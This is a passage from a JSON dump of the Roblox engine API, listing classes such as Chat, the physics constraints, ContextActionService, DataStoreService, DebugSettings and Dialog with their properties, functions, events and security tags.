aphic","tags":[]},{"ValueType":"Content","type":"Property","Name":"Graphic","tags":[],"Class":"ShirtGraphic"},{"Superclass":"CharacterAppearance","type":"Class","Name":"Skin","tags":["deprecated"]},{"ValueType":"BrickColor","type":"Property","Name":"SkinColor","tags":[],"Class":"Skin"},{"Superclass":"Instance","type":"Class","Name":"Chat","tags":["notCreatable"]},{"ReturnType":"void","Arguments":[{"Type":"Instance","Name":"partOrCharacter","Default":null},{"Type":"string","Name":"message","Default":null},{"Type":"ChatColor","Name":"color","Default":"Blue"}],"Name":"Chat","tags":[],"Class":"Chat","type":"Function"},{"ReturnType":"string","Arguments":[{"Type":"string","Name":"stringToFilter","Default":null},{"Type":"Instance","Name":"playerFrom","Default":null},{"Type":"Instance","Name":"playerTo","Default":null}],"Name":"FilterStringAsync","tags":[],"Class":"Chat","type":"YieldFunction"},{"ReturnType":"string","Arguments":[{"Type":"string","Name":"stringToFilter","Default":null},{"Type":"Instance","Name":"playerToFilterFor","Default":null}],"Name":"FilterStringForPlayerAsync","tags":[],"Class":"Chat","type":"YieldFunction"},{"Arguments":[{"Name":"part","Type":"Instance"},{"Name":"message","Type":"string"},{"Name":"color","Type":"ChatColor"}],"Name":"Chatted","tags":[],"Class":"Chat","type":"Event"},{"Superclass":"Instance","type":"Class","Name":"ChatFilter","tags":["notCreatable"]},{"Superclass":"Instance","type":"Class","Name":"ClickDetector","tags":[]},{"ValueType":"float","type":"Property","Name":"MaxActivationDistance","tags":[],"Class":"ClickDetector"},{"Arguments":[{"Name":"playerWhoClicked","Type":"Instance"}],"Name":"MouseClick","tags":[],"Class":"ClickDetector","type":"Event"},{"Arguments":[{"Name":"playerWhoHovered","Type":"Instance"}],"Name":"MouseHoverEnter","tags":[],"Class":"ClickDetector","type":"Event"},{"Arguments":[{"Name":"playerWhoHovered","Type":"Instance"}],"Name":"MouseHoverLeave","tags":[],"Class":"ClickDetector","type":"Event"},{"Arguments":[{"Name":"playerWhoClicked","Type":"Instance"}],"Name":"mouseClick","tags":["deprecated"],"Class":"ClickDetector","type":"Event"},{"Superclass":"Instance","type":"Class","Name":"ClusterPacketCache","tags":[]},{"Superclass":"Instance","type":"Class","Name":"CollectionService","tags":[]},{"ReturnType":"Objects","Arguments":[{"Type":"string","Name":"class","Default":null}],"Name":"GetCollection","tags":[],"Class":"CollectionService","type":"Function"},{"Arguments":[{"Name":"instance","Type":"Instance"}],"Name":"ItemAdded","tags":[],"Class":"CollectionService","type":"Event"},{"Arguments":[{"Name":"instance","Type":"Instance"}],"Name":"ItemRemoved","tags":[],"Class":"CollectionService","type":"Event"},{"Superclass":"Instance","type":"Class","Name":"Color3Value","tags":[]},{"ValueType":"Color3","type":"Property","Name":"Value","tags":[],"Class":"Color3Value"},{"Arguments":[{"Name":"value","Type":"Color3"}],"Name":"Changed","tags":[],"Class":"Color3Value","type":"Event"},{"Arguments":[{"Name":"value","Type":"Color3"}],"Name":"changed","tags":["deprecated"],"Class":"Color3Value","type":"Event"},{"Superclass":"Instance","type":"Class","Name":"Configuration","tags":[]},{"Superclass":"Instance","type":"Class","Name":"Constraint","tags":[]},{"ValueType":"Object","type":"Property","Name":"Attachment0","tags":[],"Class":"Constraint"},{"ValueType":"Object","type":"Property","Name":"Attachment1","tags":[],"Class":"Constraint"},{"ValueType":"bool","type":"Property","Name":"Enabled","tags":[],"Class":"Constraint"},{"Superclass":"Constraint","type":"Class","Name":"BallSocketConstraint","tags":[]},{"ValueType":"bool","type":"Property","Name":"LimitsEnabled","tags":[],"Class":"BallSocketConstraint"},{"ValueType":"float","type":"Property","Name":"Restitution","tags":[],"Class":"BallSocketConstraint"},{"ValueType":"float","type":"Property","Name":"UpperAngle","tags":[],"Class":"BallSocketConstraint"},{"Superclass":"Constraint","type":"Class","Name":"HingeConstraint","tags":[]},{"ValueType":"ActuatorType","type":"Property","Name":"ActuatorType","tags":[],"Class":"HingeConstraint"},{"ValueType":"float","type":"Property","Name":"AngularSpeed","tags":[],"Class":"HingeConstraint"},{"ValueType":"float","type":"Property","Name":"AngularVelocity","tags":[],"Class":"HingeConstraint"},{"ValueType":"float","type":"Property","Name":"CurrentAngle","tags":["readonly"],"Class":"HingeConstraint"},{"ValueType":"bool","type":"Property","Name":"LimitsEnabled","tags":[],"Class":"HingeConstraint"},{"ValueType":"float","type":"Property","Name":"LowerAngle","tags":[],"Class":"HingeConstraint"},{"ValueType":"float","type":"Property","Name":"MotorMaxAcceleration","tags":[],"Class":"HingeConstraint"},{"ValueType":"float","type":"Property","Name":"MotorMaxTorque","tags":[],"Class":"HingeConstraint"},{"ValueType":"float","type":"Property","Name":"Restitution","tags":[],"Class":"HingeConstraint"},{"ValueType":"float","type":"Property","Name":"ServoMaxTorque","tags":[],"Class":"HingeConstraint"},{"ValueType":"float","type":"Property","Name":"TargetAngle","tags":[],"Class":"HingeConstraint"},{"ValueType":"float","type":"Property","Name":"UpperAngle","tags":[],"Class":"HingeConstraint"},{"Superclass":"Constraint","type":"Class","Name":"MoveToConstraint","tags":[]},{"ValueType":"float","type":"Property","Name":"MaxForce","tags":[],"Class":"MoveToConstraint"},{"ValueType":"float","type":"Property","Name":"StabilizingDistance","tags":[],"Class":"MoveToConstraint"},{"ValueType":"float","type":"Property","Name":"Velocity","tags":[],"Class":"MoveToConstraint"},{"Superclass":"Constraint","type":"Class","Name":"RodConstraint","tags":[]},{"ValueType":"float","type":"Property","Name":"CurrentDistance","tags":["readonly"],"Class":"RodConstraint"},{"ValueType":"float","type":"Property","Name":"Length","tags":[],"Class":"RodConstraint"},{"Superclass":"Constraint","type":"Class","Name":"RopeConstraint","tags":[]},{"ValueType":"float","type":"Property","Name":"CurrentLength","tags":["readonly"],"Class":"RopeConstraint"},{"ValueType":"float","type":"Property","Name":"Length","tags":[],"Class":"RopeConstraint"},{"ValueType":"float","type":"Property","Name":"Restitution","tags":[],"Class":"RopeConstraint"},{"Superclass":"Constraint","type":"Class","Name":"SlidingBallConstraint","tags":[]},{"ValueType":"ActuatorType","type":"Property","Name":"ActuatorType","tags":[],"Class":"SlidingBallConstraint"},{"ValueType":"float","type":"Property","Name":"CurrentPosition","tags":["readonly"],"Class":"SlidingBallConstraint"},{"ValueType":"bool","type":"Property","Name":"LimitsEnabled","tags":[],"Class":"SlidingBallConstraint"},{"ValueType":"float","type":"Property","Name":"LowerLimit","tags":[],"Class":"SlidingBallConstraint"},{"ValueType":"float","type":"Property","Name":"MotorMaxAcceleration","tags":[],"Class":"SlidingBallConstraint"},{"ValueType":"float","type":"Property","Name":"MotorMaxForce","tags":[],"Class":"SlidingBallConstraint"},{"ValueType":"float","type":"Property","Name":"Restitution","tags":[],"Class":"SlidingBallConstraint"},{"ValueType":"float","type":"Property","Name":"ServoMaxForce","tags":[],"Class":"SlidingBallConstraint"},{"ValueType":"float","type":"Property","Name":"Speed","tags":[],"Class":"SlidingBallConstraint"},{"ValueType":"float","type":"Property","Name":"TargetPosition","tags":[],"Class":"SlidingBallConstraint"},{"ValueType":"float","type":"Property","Name":"UpperLimit","tags":[],"Class":"SlidingBallConstraint"},{"ValueType":"float","type":"Property","Name":"Velocity","tags":[],"Class":"SlidingBallConstraint"},{"Superclass":"SlidingBallConstraint","type":"Class","Name":"CylindricalConstraint","tags":[]},{"ValueType":"float","type":"Property","Name":"AzimuthalAngle","tags":[],"Class":"CylindricalConstraint"},{"ValueType":"float","type":"Property","Name":"InclinationAngle","tags":[],"Class":"CylindricalConstraint"},{"Superclass":"SlidingBallConstraint","type":"Class","Name":"PrismaticConstraint","tags":[]},{"Superclass":"Constraint","type":"Class","Name":"SpringConstraint","tags":[]},{"ValueType":"float","type":"Property","Name":"CurrentLength","tags":["readonly"],"Class":"SpringConstraint"},{"ValueType":"float","type":"Property","Name":"Damping","tags":[],"Class":"SpringConstraint"},{"ValueType":"float","type":"Property","Name":"FreeLength","tags":[],"Class":"SpringConstraint"},{"ValueType":"bool","type":"Property","Name":"LimitsEnabled","tags":[],"Class":"SpringConstraint"},{"ValueType":"float","type":"Property","Name":"MaxForce","tags":[],"Class":"SpringConstraint"},{"ValueType":"float","type":"Property","Name":"MaxLength","tags":[],"Class":"SpringConstraint"},{"ValueType":"float","type":"Property","Name":"MinLength","tags":[],"Class":"SpringConstraint"},{"ValueType":"float","type":"Property","Name":"Stiffness","tags":[],"Class":"SpringConstraint"},{"Superclass":"Instance","type":"Class","Name":"ContentFilter","tags":[]},{"ReturnType":"void","Arguments":[{"Type":"int","Name":"outstandingRequests","Default":null},{"Type":"int","Name":"cacheSize","Default":null}],"Name":"SetFilterLimits","tags":["LocalUserSecurity"],"Class":"ContentFilter","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"url","Default":null}],"Name":"SetFilterUrl","tags":["LocalUserSecurity"],"Class":"ContentFilter","type":"Function"},{"Superclass":"Instance","type":"Class","Name":"ContentProvider","tags":[]},{"ValueType":"string","type":"Property","Name":"BaseUrl","tags":["readonly"],"Class":"ContentProvider"},{"ValueType":"int","type":"Property","Name":"RequestQueueSize","tags":["readonly"],"Class":"ContentProvider"},{"ReturnType":"void","Arguments":[{"Type":"Content","Name":"contentId","Default":null}],"Name":"Preload","tags":[],"Class":"ContentProvider","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"url","Default":null}],"Name":"SetAssetUrl","tags":["LocalUserSecurity"],"Class":"ContentProvider","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"url","Default":null}],"Name":"SetBaseUrl","tags":["LocalUserSecurity"],"Class":"ContentProvider","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"int","Name":"count","Default":null}],"Name":"SetCacheSize","tags":["LocalUserSecurity"],"Class":"ContentProvider","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"int","Name":"count","Default":null}],"Name":"SetThreadPool","tags":["LocalUserSecurity"],"Class":"ContentProvider","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"Array","Name":"contentIdList","Default":null}],"Name":"PreloadAsync","tags":[],"Class":"ContentProvider","type":"YieldFunction"},{"Superclass":"Instance","type":"Class","Name":"ContextActionService","tags":[]},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"actionName","Default":null},{"Type":"Function","Name":"functionToBind","Default":null},{"Type":"bool","Name":"createTouchButton","Default":null},{"Type":"Tuple","Name":"inputTypes","Default":null}],"Name":"BindAction","tags":[],"Class":"ContextActionService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"actionName","Default":null},{"Type":"Function","Name":"functionToBind","Default":null},{"Type":"bool","Name":"createTouchButton","Default":null},{"Type":"Tuple","Name":"inputTypes","Default":null}],"Name":"BindActionToInputTypes","tags":["deprecated"],"Class":"ContextActionService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"UserInputType","Name":"userInputTypeForActivation","Default":null},{"Type":"KeyCode","Name":"keyCodeForActivation","Default":"Unknown"}],"Name":"BindActivate","tags":[],"Class":"ContextActionService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"actionName","Default":null},{"Type":"Function","Name":"functionToBind","Default":null},{"Type":"bool","Name":"createTouchButton","Default":null},{"Type":"Tuple","Name":"inputTypes","Default":null}],"Name":"BindCoreAction","tags":["RobloxScriptSecurity"],"Class":"ContextActionService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"actionName","Default":null},{"Type":"UserInputState","Name":"state","Default":null},{"Type":"Instance","Name":"inputObject","Default":null}],"Name":"CallFunction","tags":["RobloxScriptSecurity"],"Class":"ContextActionService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"actionName","Default":null},{"Type":"Instance","Name":"actionButton","Default":null}],"Name":"FireActionButtonFoundSignal","tags":["RobloxScriptSecurity"],"Class":"ContextActionService","type":"Function"},{"ReturnType":"Dictionary","Arguments":[],"Name":"GetAllBoundActionInfo","tags":[],"Class":"ContextActionService","type":"Function"},{"ReturnType":"Dictionary","Arguments":[{"Type":"string","Name":"actionName","Default":null}],"Name":"GetBoundActionInfo","tags":[],"Class":"ContextActionService","type":"Function"},{"ReturnType":"string","Arguments":[],"Name":"GetCurrentLocalToolIcon","tags":[],"Class":"ContextActionService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"actionName","Default":null},{"Type":"string","Name":"description","Default":null}],"Name":"SetDescription","tags":[],"Class":"ContextActionService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"actionName","Default":null},{"Type":"string","Name":"image","Default":null}],"Name":"SetImage","tags":[],"Class":"ContextActionService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"actionName","Default":null},{"Type":"UDim2","Name":"position","Default":null}],"Name":"SetPosition","tags":[],"Class":"ContextActionService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"actionName","Default":null},{"Type":"string","Name":"title","Default":null}],"Name":"SetTitle","tags":[],"Class":"ContextActionService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"actionName","Default":null}],"Name":"UnbindAction","tags":[],"Class":"ContextActionService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"UserInputType","Name":"userInputTypeForActivation","Default":null},{"Type":"KeyCode","Name":"keyCodeForActivation","Default":"Unknown"}],"Name":"UnbindActivate","tags":[],"Class":"ContextActionService","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"UnbindAllActions","tags":[],"Class":"ContextActionService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"actionName","Default":null}],"Name":"UnbindCoreAction","tags":["RobloxScriptSecurity"],"Class":"ContextActionService","type":"Function"},{"ReturnType":"Instance","Arguments":[{"Type":"string","Name":"actionName","Default":null}],"Name":"GetButton","tags":[],"Class":"ContextActionService","type":"YieldFunction"},{"Arguments":[{"Name":"actionAdded","Type":"string"},{"Name":"createTouchButton","Type":"bool"},{"Name":"functionInfoTable","Type":"Dictionary"}],"Name":"BoundActionAdded","tags":["RobloxScriptSecurity"],"Class":"ContextActionService","type":"Event"},{"Arguments":[{"Name":"actionChanged","Type":"string"},{"Name":"changeName","Type":"string"},{"Name":"changeTable","Type":"Dictionary"}],"Name":"BoundActionChanged","tags":["RobloxScriptSecurity"],"Class":"ContextActionService","type":"Event"},{"Arguments":[{"Name":"actionRemoved","Type":"string"},{"Name":"functionInfoTable","Type":"Dictionary"}],"Name":"BoundActionRemoved","tags":["RobloxScriptSecurity"],"Class":"ContextActionService","type":"Event"},{"Arguments":[{"Name":"actionName","Type":"string"}],"Name":"GetActionButtonEvent","tags":["RobloxScriptSecurity"],"Class":"ContextActionService","type":"Event"},{"Arguments":[{"Name":"toolEquipped","Type":"Instance"}],"Name":"LocalToolEquipped","tags":[],"Class":"ContextActionService","type":"Event"},{"Arguments":[{"Name":"toolUnequipped","Type":"Instance"}],"Name":"LocalToolUnequipped","tags":[],"Class":"ContextActionService","type":"Event"},{"Superclass":"Instance","type":"Class","Name":"Controller","tags":[]},{"ReturnType":"void","Arguments":[{"Type":"Button","Name":"button","Default":null},{"Type":"string","Name":"caption","Default":null}],"Name":"BindButton","tags":[],"Class":"Controller","type":"Function"},{"ReturnType":"bool","Arguments":[{"Type":"Button","Name":"button","Default":null}],"Name":"GetButton","tags":[],"Class":"Controller","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"Button","Name":"button","Default":null}],"Name":"UnbindButton","tags":[],"Class":"Controller","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"Button","Name":"button","Default":null},{"Type":"string","Name":"caption","Default":null}],"Name":"bindButton","tags":["deprecated"],"Class":"Controller","type":"Function"},{"ReturnType":"bool","Arguments":[{"Type":"Button","Name":"button","Default":null}],"Name":"getButton","tags":["deprecated"],"Class":"Controller","type":"Function"},{"Arguments":[{"Name":"button","Type":"Button"}],"Name":"ButtonChanged","tags":[],"Class":"Controller","type":"Event"},{"Superclass":"Controller","type":"Class","Name":"HumanoidController","tags":[]},{"Superclass":"Controller","type":"Class","Name":"SkateboardController","tags":[]},{"ValueType":"float","type":"Property","Name":"Steer","tags":["readonly"],"Class":"SkateboardController"},{"ValueType":"float","type":"Property","Name":"Throttle","tags":["readonly"],"Class":"SkateboardController"},{"Arguments":[{"Name":"axis","Type":"string"}],"Name":"AxisChanged","tags":[],"Class":"SkateboardController","type":"Event"},{"Superclass":"Controller","type":"Class","Name":"VehicleController","tags":[]},{"Superclass":"Instance","type":"Class","Name":"ControllerService","tags":["notCreatable"]},{"Superclass":"Instance","type":"Class","Name":"CookiesService","tags":[]},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"key","Default":null}],"Name":"DeleteCookieValue","tags":["RobloxSecurity"],"Class":"CookiesService","type":"Function"},{"ReturnType":"string","Arguments":[{"Type":"string","Name":"key","Default":null}],"Name":"GetCookieValue","tags":["RobloxSecurity"],"Class":"CookiesService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"key","Default":null},{"Type":"string","Name":"value","Default":null}],"Name":"SetCookieValue","tags":["RobloxSecurity"],"Class":"CookiesService","type":"Function"},{"Superclass":"Instance","type":"Class","Name":"CustomEvent","tags":["deprecated"]},{"ReturnType":"Objects","Arguments":[],"Name":"GetAttachedReceivers","tags":[],"Class":"CustomEvent","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"float","Name":"newValue","Default":null}],"Name":"SetValue","tags":[],"Class":"CustomEvent","type":"Function"},{"Arguments":[{"Name":"receiver","Type":"Instance"}],"Name":"ReceiverConnected","tags":[],"Class":"CustomEvent","type":"Event"},{"Arguments":[{"Name":"receiver","Type":"Instance"}],"Name":"ReceiverDisconnected","tags":[],"Class":"CustomEvent","type":"Event"},{"Superclass":"Instance","type":"Class","Name":"CustomEventReceiver","tags":["deprecated"]},{"ValueType":"Object","type":"Property","Name":"Source","tags":[],"Class":"CustomEventReceiver"},{"ReturnType":"float","Arguments":[],"Name":"GetCurrentValue","tags":[],"Class":"CustomEventReceiver","type":"Function"},{"Arguments":[{"Name":"event","Type":"Instance"}],"Name":"EventConnected","tags":[],"Class":"CustomEventReceiver","type":"Event"},{"Arguments":[{"Name":"event","Type":"Instance"}],"Name":"EventDisconnected","tags":[],"Class":"CustomEventReceiver","type":"Event"},{"Arguments":[{"Name":"newValue","Type":"float"}],"Name":"SourceValueChanged","tags":[],"Class":"CustomEventReceiver","type":"Event"},{"Superclass":"Instance","type":"Class","Name":"DataModelMesh","tags":["notbrowsable"]},{"ValueType":"Vector3","type":"Property","Name":"Offset","tags":[],"Class":"DataModelMesh"},{"ValueType":"Vector3","type":"Property","Name":"Scale","tags":[],"Class":"DataModelMesh"},{"ValueType":"Vector3","type":"Property","Name":"VertexColor","tags":[],"Class":"DataModelMesh"},{"Superclass":"DataModelMesh","type":"Class","Name":"BevelMesh","tags":["deprecated","notbrowsable"]},{"Superclass":"BevelMesh","type":"Class","Name":"BlockMesh","tags":[]},{"Superclass":"BevelMesh","type":"Class","Name":"CylinderMesh","tags":[]},{"Superclass":"DataModelMesh","type":"Class","Name":"FileMesh","tags":[]},{"ValueType":"Content","type":"Property","Name":"MeshId","tags":[],"Class":"FileMesh"},{"ValueType":"Content","type":"Property","Name":"TextureId","tags":[],"Class":"FileMesh"},{"Superclass":"FileMesh","type":"Class","Name":"SpecialMesh","tags":[]},{"ValueType":"MeshType","type":"Property","Name":"MeshType","tags":[],"Class":"SpecialMesh"},{"Superclass":"Instance","type":"Class","Name":"DataStoreService","tags":["notCreatable"]},{"ValueType":"bool","type":"Property","Name":"LegacyNamingScheme","tags":["LocalUserSecurity"],"Class":"DataStoreService"},{"ReturnType":"Instance","Arguments":[{"Type":"string","Name":"name","Default":null},{"Type":"string","Name":"scope","Default":"global"}],"Name":"GetDataStore","tags":[],"Class":"DataStoreService","type":"Function"},{"ReturnType":"Instance","Arguments":[],"Name":"GetGlobalDataStore","tags":[],"Class":"DataStoreService","type":"Function"},{"ReturnType":"Instance","Arguments":[{"Type":"string","Name":"name","Default":null},{"Type":"string","Name":"scope","Default":"global"}],"Name":"GetOrderedDataStore","tags":[],"Class":"DataStoreService","type":"Function"},{"Superclass":"Instance","type":"Class","Name":"Debris","tags":[]},{"ValueType":"int","type":"Property","Name":"MaxItems","tags":["deprecated"],"Class":"Debris"},{"ReturnType":"void","Arguments":[{"Type":"Instance","Name":"item","Default":null},{"Type":"double","Name":"lifetime","Default":"10"}],"Name":"AddItem","tags":[],"Class":"Debris","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"bool","Name":"enabled","Default":null}],"Name":"SetLegacyMaxItems","tags":["LocalUserSecurity"],"Class":"Debris","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"Instance","Name":"item","Default":null},{"Type":"double","Name":"lifetime","Default":"10"}],"Name":"addItem","tags":["deprecated"],"Class":"Debris","type":"Function"},{"Superclass":"Instance","type":"Class","Name":"DebugSettings","tags":["notbrowsable"]},{"ValueType":"int","type":"Property","Name":"AltCdnFailureCount","tags":["readonly"],"Class":"DebugSettings"},{"ValueType":"int","type":"Property","Name":"AltCdnSuccessCount","tags":["readonly"],"Class":"DebugSettings"},{"ValueType":"int","type":"Property","Name":"AvailablePhysicalMemory","tags":["readonly"],"Class":"DebugSettings"},{"ValueType":"int","type":"Property","Name":"BlockMeshSize","tags":["readonly"],"Class":"DebugSettings"},{"ValueType":"string","type":"Property","Name":"CPU","tags":["readonly"],"Class":"DebugSettings"},{"ValueType":"int","type":"Property","Name":"CdnFailureCount","tags":["readonly"],"Class":"DebugSettings"},{"ValueType":"double","type":"Property","Name":"CdnResponceTime","tags":["readonly"],"Class":"DebugSettings"},{"ValueType":"int","type":"Property","Name":"CdnSuccessCount","tags":["readonly"],"Class":"DebugSettings"},{"ValueType":"int","type":"Property","Name":"CpuCount","tags":["readonly"],"Class":"DebugSettings"},{"ValueType":"int","type":"Property","Name":"CpuSpeed","tags":["readonly"],"Class":"DebugSettings"},{"ValueType":"int","type":"Property","Name":"DataModel","tags":["readonly"],"Class":"DebugSettings"},{"ValueType":"double","type":"Property","Name":"ElapsedTime","tags":["readonly"],"Class":"DebugSettings"},{"ValueType":"ErrorReporting","type":"Property","Name":"ErrorReporting","tags":[],"Class":"DebugSettings"},{"ValueType":"string","type":"Property","Name":"GfxCard","tags":["readonly"],"Class":"DebugSettings"},{"ValueType":"int","type":"Property","Name":"InstanceCount","tags":["readonly"],"Class":"DebugSettings"},{"ValueType":"bool","type":"Property","Name":"IsFmodProfilingEnabled","tags":[],"Class":"DebugSettings"},{"ValueType":"bool","type":"Property","Name":"IsProfilingEnabled","tags":[],"Class":"DebugSettings"},{"ValueType":"bool","type":"Property","Name":"IsScriptStackTracingEnabled","tags":[],"Class":"DebugSettings"},{"ValueType":"int","type":"Property","Name":"JobCount","tags":["readonly"],"Class":"DebugSettings"},{"ValueType":"double","type":"Property","Name":"LastCdnFailureTimeSpan","tags":["readonly"],"Class":"DebugSettings"},{"ValueType":"int","type":"Property","Name":"LuaRamLimit","tags":[],"Class":"DebugSettings"},{"ValueType":"int","type":"Property","Name":"NameDatabaseBytes","tags":["readonly"],"Class":"DebugSettings"},{"ValueType":"int","type":"Property","Name":"NameDatabaseSize","tags":["readonly"],"Class":"DebugSettings"},{"ValueType":"bool","type":"Property","Name":"OsIs64Bit","tags":["readonly"],"Class":"DebugSettings"},{"ValueType":"string","type":"Property","Name":"OsPlatform","tags":["readonly"],"Class":"DebugSettings"},{"ValueType":"int","type":"Property","Name":"OsPlatformId","tags":["readonly"],"Class":"DebugSettings"},{"ValueType":"string","type":"Property","Name":"OsVer","tags":["readonly"],"Class":"DebugSettings"},{"ValueType":"int","type":"Property","Name":"PageFaultsPerSecond","tags":["readonly"],"Class":"DebugSettings"},{"ValueType":"int","type":"Property","Name":"PageFileBytes","tags":["readonly"],"Class":"DebugSettings"},{"ValueType":"float","type":"Property","Name":"PixelShaderModel","tags":["readonly"],"Class":"DebugSettings"},{"ValueType":"int","type":"Property","Name":"PlayerCount","tags":["readonly"],"Class":"DebugSettings"},{"ValueType":"int","type":"Property","Name":"PrivateBytes","tags":["readonly"],"Class":"DebugSettings"},{"ValueType":"int","type":"Property","Name":"PrivateWorkingSetBytes","tags":["readonly"],"Class":"DebugSettings"},{"ValueType":"double","type":"Property","Name":"ProcessCores","tags":["readonly"],"Class":"DebugSettings"},{"ValueType":"int","type":"Property","Name":"ProcessorTime","tags":["readonly"],"Class":"DebugSettings"},{"ValueType":"double","type":"Property","Name":"ProfilingWindow","tags":[],"Class":"DebugSettings"},{"ValueType":"int","type":"Property","Name":"RAM","tags":["readonly"],"Class":"DebugSettings"},{"ValueType":"bool","type":"Property","Name":"ReportExtendedMachineConfiguration","tags":[],"Class":"DebugSettings"},{"ValueType":"bool","type":"Property","Name":"ReportSoundWarnings","tags":[],"Class":"DebugSettings"},{"ValueType":"string","type":"Property","Name":"Resolution","tags":["readonly"],"Class":"DebugSettings"},{"ValueType":"int","type":"Property","Name":"RobloxFailureCount","tags":["readonly"],"Class":"DebugSettings"},{"ValueType":"string","type":"Property","Name":"RobloxProductName","tags":["readonly"],"Class":"DebugSettings"},{"ValueType":"double","type":"Property","Name":"RobloxRespoceTime","tags":["readonly"],"Class":"DebugSettings"},{"ValueType":"int","type":"Property","Name":"RobloxSuccessCount","tags":["readonly"],"Class":"DebugSettings"},{"ValueType":"string","type":"Property","Name":"RobloxVersion","tags":["readonly"],"Class":"DebugSettings"},{"ValueType":"string","type":"Property","Name":"SIMD","tags":["readonly"],"Class":"DebugSettings"},{"ValueType":"string","type":"Property","Name":"SystemProductName","tags":["readonly"],"Class":"DebugSettings"},{"ValueType":"TickCountSampleMethod","type":"Property","Name":"TickCountPreciseOverride","tags":[],"Class":"DebugSettings"},{"ValueType":"int","type":"Property","Name":"TotalPhysicalMemory","tags":["readonly"],"Class":"DebugSettings"},{"ValueType":"int","type":"Property","Name":"TotalProcessorTime","tags":["readonly"],"Class":"DebugSettings"},{"ValueType":"float","type":"Property","Name":"VertexShaderModel","tags":["readonly"],"Class":"DebugSettings"},{"ValueType":"int","type":"Property","Name":"VideoMemory","tags":["readonly"],"Class":"DebugSettings"},{"ValueType":"int","type":"Property","Name":"VirtualBytes","tags":["readonly"],"Class":"DebugSettings"},{"ReturnType":"void","Arguments":[],"Name":"LegacyScriptMode","tags":["LocalUserSecurity","deprecated"],"Class":"DebugSettings","type":"Function"},{"ReturnType":"Tuple","Arguments":[],"Name":"ResetCdnFailureCounts","tags":["LocalUserSecurity"],"Class":"DebugSettings","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"bool","Name":"value","Default":null}],"Name":"SetBlockingRemove","tags":["LocalUserSecurity"],"Class":"DebugSettings","type":"Function"},{"Superclass":"Instance","type":"Class","Name":"DebuggerBreakpoint","tags":["notCreatable"]},{"ValueType":"string","type":"Property","Name":"Condition","tags":[],"Class":"DebuggerBreakpoint"},{"ValueType":"bool","type":"Property","Name":"IsEnabled","tags":[],"Class":"DebuggerBreakpoint"},{"ValueType":"int","type":"Property","Name":"Line","tags":["readonly"],"Class":"DebuggerBreakpoint"},{"Superclass":"Instance","type":"Class","Name":"DebuggerManager","tags":["notCreatable"]},{"ValueType":"bool","type":"Property","Name":"DebuggingEnabled","tags":["readonly"],"Class":"DebuggerManager"},{"ReturnType":"Instance","Arguments":[{"Type":"Instance","Name":"script","Default":null}],"Name":"AddDebugger","tags":[],"Class":"DebuggerManager","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"EnableDebugging","tags":["LocalUserSecurity"],"Class":"DebuggerManager","type":"Function"},{"ReturnType":"Objects","Arguments":[],"Name":"GetDebuggers","tags":[],"Class":"DebuggerManager","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"Resume","tags":[],"Class":"DebuggerManager","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"StepIn","tags":[],"Class":"DebuggerManager","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"StepOut","tags":[],"Class":"DebuggerManager","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"StepOver","tags":[],"Class":"DebuggerManager","type":"Function"},{"Arguments":[{"Name":"debugger","Type":"Instance"}],"Name":"DebuggerAdded","tags":[],"Class":"DebuggerManager","type":"Event"},{"Arguments":[{"Name":"debugger","Type":"Instance"}],"Name":"DebuggerRemoved","tags":[],"Class":"DebuggerManager","type":"Event"},{"Superclass":"Instance","type":"Class","Name":"DebuggerWatch","tags":[]},{"ValueType":"string","type":"Property","Name":"Expression","tags":[],"Class":"DebuggerWatch"},{"ReturnType":"void","Arguments":[],"Name":"CheckSyntax","tags":[],"Class":"DebuggerWatch","type":"Function"},{"Superclass":"Instance","type":"Class","Name":"Dialog","tags":[]},{"ValueType":"float","type":"Property","Name":"ConversationDistance","tags":[],"Class":"Dialog"},{"ValueType":"string","type":"Property","Name":"GoodbyeDialog","tags":[],"Class":"Dialog"},{"ValueType":"bool","type":"Property","Name":"InUse","tags":[],"Class":"Dialog"},{"ValueType":"string","type":"Property","Name":"InitialPrompt","tags":[],"Class":"Dialog"},{"ValueType":"DialogPurpose","type":"Property","Name":"Purpose","tags":[],"Class":"Dialog"},{"ValueType":"DialogTone","type":"Property","Name":"Tone","tags":[],"Class":"Dialog"},{"ReturnType":"void","Arguments":[{"Type":"Instance","Name":"player","Default":null},{"Type":"Instance","Name":"dialogChoice","Default":null}],"Name":"SignalDialogChoiceSelected","tags":["RobloxScriptSecurity"],"Class":"Dialog","type":"Function"},{"Arguments":[{"Name":"player","Type":"Instance"},{"Name":"dialogChoice","Type":"Instance"}],"Name":"DialogChoiceSelected","tags":[],"Class":"Dialog","type":"Event"},{"Superclass":"Instance","type":"Class","Name":"DialogChoice","tags":[]},{"ValueType":"string","type":"Property",